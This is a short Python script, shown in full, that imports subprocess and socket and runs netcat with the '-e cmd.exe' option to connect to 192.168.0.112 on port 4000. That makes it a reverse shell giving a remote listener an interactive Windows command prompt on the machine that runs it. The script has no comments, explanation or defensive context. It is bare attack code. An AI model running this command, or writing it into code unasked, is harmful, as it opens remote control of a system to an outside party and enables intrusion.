
import subprocess
import socket



x = subprocess.call(["nc", "-e", "cmd.exe", "192.168.0.112", "4000"])
